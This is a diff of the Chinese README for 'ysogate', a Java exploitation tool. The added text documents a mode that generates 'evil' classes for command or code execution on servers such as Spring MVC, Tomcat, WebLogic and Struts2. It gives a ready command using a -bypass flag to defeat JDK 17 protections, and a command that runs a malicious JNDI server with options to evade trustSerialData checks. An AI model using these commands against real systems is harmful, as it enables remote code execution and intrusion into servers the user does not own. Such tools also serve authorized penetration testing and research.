@@ -11,13 +11,71 @@ ysogate是一个java综合利用工具，支持JNDI注入相关利用，包含�
 
 ## Usage
 
-分为两种模式，指定`-m jndi`来启动 JNDI Server，指定`-m payload`来生成反序列化payload
+分为两种模式，指定`-m jndi`来启动 JNDI Server，指定`-m payload`来生成反序列化payload，指定`-m gen`来生成恶意类
 
 ```bash
+[root]#~  H4cking to the Gate !
+[root]#~  Usage:
 [root]#~  Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]
-[root]#~  JNDI Mode:    java -jar ysogate-[version]-all.jar -m jndi [JNDI OPTIONS]
+[root]#~  JNDI    Mode: java -jar ysogate-[version]-all.jar -m jndi    [JNDI OPTIONS]
+[root]#~  Gen     Mode: java -jar ysogate-[version]-all.jar -m gen     [GEN OPTIONS]
 ```
+## Gen Mode
+
+可以使用`-m gen`来使用gen模式，用于生成恶意类
+
+```
+[root]#~  Gen Mode Options:
+ -bypass                   ByPass JDK Module
+ -f,--format <arg>         Output format
+ -h,--help                 Show help message
+ -m,--mode <arg>           Operation mode: 'payload' or 'jndi' or 'gen'
+ -name,--classname <arg>   Evil Class Name
+ -s,--sink <arg>           Evil sink template
+ -t,--type <arg>           Middleware type
+```
+
+示例，生成springmvc的命令执行回显，添加-bypass绕过jdk高版本限制，适用于jdk17
+
+```
+java -jar ysogate-[version]-all.jar -m gen -t springmvc -s CmdExec -name org.springframework.expression.Evil -bypass
+```
+
+以下是支持的中间件/框架以及执行模式
+
+| 中间件/框架 | 执行模式          |
+| ----------- | ----------------- |
+| springmvc   | CmdExec，CodeExec |
+| tomcat      | CmdExec，CodeExec |
+| resin       | CmdExec，CodeExec |
+| weblogic    | CmdExec，CodeExec |
+| jetty       | CmdExec，CodeExec |
+| websphere   | CmdExec，CodeExec |
+| undertow    | CmdExec，CodeExec |
+| glassfish   | CmdExec，CodeExec |
+| struts2     | CmdExec，CodeExec |
+
 ## JNDI Mode
+
+可以使用`-m jndi`来使用jndi模式，这个模式会在本地运行恶意的jndi服务器
+
+```
+[root]#~  JNDI Mode Options:
+ -h,--help              Show help message
+ -hp,--httpPort <arg>   HTTP port
+ -i,--ip <arg>          IP address for JNDI server
+ -ldap2rmi              change ldap to rmi to bypass trustSerialData
+ -lp,--ldapPort <arg>   LDAP port
+ -m,--mode <arg>        Operation mode: 'payload' or 'jndi' or 'gen'
+ -onlyRef               use Reference only to bypass trustSerialData
+ -rp,--rmiPort <arg>    RMI port
+```
+
+例如
+
+```
+java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -onlyRef
+```
 
 ### trustSerialData 绕过
 
